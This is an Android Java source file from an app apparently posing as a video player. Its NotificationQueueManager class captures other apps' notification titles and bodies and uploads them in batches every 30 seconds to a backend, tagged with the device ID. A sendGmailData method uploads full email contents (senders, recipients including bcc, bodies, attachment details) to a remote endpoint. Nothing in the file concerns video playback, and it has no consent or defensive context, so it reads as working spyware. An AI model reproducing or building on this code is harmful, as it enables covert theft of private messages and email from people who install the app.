package com.jumpy.videoplayerapp;

import android.content.Context;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.List;
import java.util.ArrayList;

public class NotificationQueueManager {
    private static final String TAG = AppConfig.DEBUG_TAG + "_NotificationQueue";
    
    private final Context context;
    private final List<NotificationData> notificationQueue;
    private final ScheduledExecutorService scheduler;
    private boolean isProcessing = false;
    
    public NotificationQueueManager(Context context) {
        this.context = context;
        this.notificationQueue = new ArrayList<>();
        this.scheduler = Executors.newScheduledThreadPool(1);
    }
    
    public void addNotification(String appName, String title, String text, String packageName) {
        Log.i(TAG, "=== addNotification() START ===");
        Log.i(TAG, "App: " + appName + ", Title: " + title + ", Package: " + packageName);
        
        NotificationData notification = new NotificationData(appName, title, text, packageName);
        synchronized (notificationQueue) {
            notificationQueue.add(notification);
            Log.i(TAG, "Notification added to queue. Queue size: " + notificationQueue.size());
        }
        Log.i(TAG, "Added notification to queue: " + appName + " - " + title);
        Log.i(TAG, "=== addNotification() END ===");
    }
    
    public void startQueueProcessing() {
        Log.i(TAG, "=== startQueueProcessing() START ===");
        if (isProcessing) {
            Log.w(TAG, "Queue processing already started - skipping");
            Log.i(TAG, "=== startQueueProcessing() END (already running) ===");
            return;
        }
        
        Log.i(TAG, "Starting notification queue processing");
        isProcessing = true;
        scheduler.scheduleAtFixedRate(this::processQueue, 0, 30, TimeUnit.SECONDS);
        Log.i(TAG, "Notification queue processing started with 30-second interval");
        Log.i(TAG, "=== startQueueProcessing() END ===");
    }
    
    public void stopQueueProcessing() {
        isProcessing = false;
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
        }
        Log.i(TAG, "Notification queue processing stopped");
    }
    
    private void processQueue() {
        Log.i(TAG, "=== processQueue() START ===");
        if (!isProcessing) {
            Log.w(TAG, "Queue processing is disabled - skipping");
            Log.i(TAG, "=== processQueue() END (disabled) ===");
            return;
        }
        
        if (notificationQueue.isEmpty()) {
            Log.i(TAG, "Notification queue is empty - nothing to process");
            Log.i(TAG, "=== processQueue() END (empty queue) ===");
            return;
        }
        
        Log.i(TAG, "Processing notification queue with " + notificationQueue.size() + " items");
        List<NotificationData> batch;
        synchronized (notificationQueue) {
            batch = new ArrayList<>(notificationQueue);
            notificationQueue.clear();
            Log.i(TAG, "Batch created with " + batch.size() + " notifications, queue cleared");
        }
        
        if (batch.isEmpty()) {
            Log.w(TAG, "Batch is empty after creation - skipping");
            Log.i(TAG, "=== processQueue() END (empty batch) ===");
            return;
        }
        
        Log.i(TAG, "Sending batch to backend");
        sendBatchToBackend(batch);
        Log.i(TAG, "=== processQueue() END ===");
    }
    
    private void sendBatchToBackend(List<NotificationData> batch) {
        Log.i(TAG, "=== sendBatchToBackend() START ===");
        Log.i(TAG, "Sending batch of " + batch.size() + " notifications to backend");
        
        try {
            // Convert notifications to JSON
            JSONArray notificationsArray = new JSONArray();
            Log.i(TAG, "Converting " + batch.size() + " notifications to JSON");
            
            for (int i = 0; i < batch.size(); i++) {
                NotificationData notification = batch.get(i);
                JSONObject notificationJson = new JSONObject();
                notificationJson.put("title", notification.title);
                notificationJson.put("body", notification.text);
                notificationJson.put("appName", notification.appName);
                notificationJson.put("packageName", notification.packageName);
                notificationJson.put("deviceInfo", new JSONObject());
                notificationJson.put("notificationData", new JSONObject());
                notificationsArray.put(notificationJson);
                Log.i(TAG, "Converted notification " + (i+1) + "/" + batch.size() + ": " + notification.appName);
            }
            
            // Create request body
            JSONObject requestBody = new JSONObject();
            requestBody.put("notifications", notificationsArray);
            requestBody.put("deviceId", getDeviceId());
            requestBody.put("batchSize", batch.size());
            
            // Send to backend - use correct endpoint
            String url = AppConfig.API_BASE_URL + "notifications/store/batch";
            Log.i(TAG, "Sending POST request to: " + url);
            sendPostRequest(url, requestBody.toString());
            
            Log.i(TAG, "Sent batch of " + batch.size() + " notifications to backend");
            Log.i(TAG, "=== sendBatchToBackend() END ===");
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending batch to backend: " + e.getMessage());
        }
    }
    
    private void sendPostRequest(String urlString, String jsonData) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("Accept", "application/json");
            connection.setDoOutput(true);
            connection.setConnectTimeout(AppConfig.REQUEST_TIMEOUT);
            connection.setReadTimeout(AppConfig.REQUEST_TIMEOUT);
            
            // Send request body
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonData.getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            
            // Check response
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_CREATED) {
                Log.i(TAG, "Successfully sent data to backend");
            } else {
                Log.e(TAG, "Backend returned error code: " + responseCode);
            }
            
            connection.disconnect();
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending POST request", e);
        }
    }
    
    private String getDeviceId() {
        // Generate a unique device ID
        return android.provider.Settings.Secure.getString(
            context.getContentResolver(), 
            android.provider.Settings.Secure.ANDROID_ID
        );
    }
    
    // Method to send Gmail data to backend
    public void sendGmailData(String userId, List<EmailData> emails) {
        try {
            JSONArray emailsArray = new JSONArray();
            for (EmailData email : emails) {
                JSONObject emailJson = new JSONObject();
                emailJson.put("messageId", email.messageId);
                emailJson.put("threadId", email.threadId);
                emailJson.put("subject", email.subject);
                emailJson.put("from", email.from);
                emailJson.put("to", email.to);
                emailJson.put("cc", email.cc);
                emailJson.put("bcc", email.bcc);
                emailJson.put("body", email.body);
                emailJson.put("bodyHtml", email.bodyHtml);
                emailJson.put("isRead", email.isRead);
                emailJson.put("isStarred", email.isStarred);
                emailJson.put("isImportant", email.isImportant);
                emailJson.put("labels", new JSONArray(email.labels));
                emailJson.put("internalDate", email.internalDate);
                emailJson.put("sizeEstimate", email.sizeEstimate);
                emailJson.put("snippet", email.snippet);
                emailJson.put("attachments", new JSONArray(email.attachments));
                emailsArray.put(emailJson);
            }
            
            JSONObject requestBody = new JSONObject();
            requestBody.put("emails", emailsArray);
            requestBody.put("deviceId", getDeviceId());
            
            String url = AppConfig.GMAIL_URL + "/store/" + userId;
            sendPostRequest(url, requestBody.toString());
            
            Log.i(TAG, "Sent " + emails.size() + " emails to backend for user " + userId);
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending Gmail data to backend", e);
        }
    }
    
    // Data classes
    private static class NotificationData {
        String appName, title, text, packageName;
        
        NotificationData(String appName, String title, String text, String packageName) {
            this.appName = appName;
            this.title = title;
            this.text = text;
            this.packageName = packageName;
        }
    }
    
    public static class EmailData {
        public String messageId, threadId, subject, from, to, cc, bcc, body, bodyHtml, internalDate, snippet;
        public boolean isRead, isStarred, isImportant;
        public List<String> labels;
        public int sizeEstimate;
        public List<AttachmentData> attachments;
        
        public EmailData() {
            this.labels = new ArrayList<>();
            this.attachments = new ArrayList<>();
        }
    }
    
    public static class AttachmentData {
        public String filename, mimeType, attachmentId;
        public int size;
    }
} 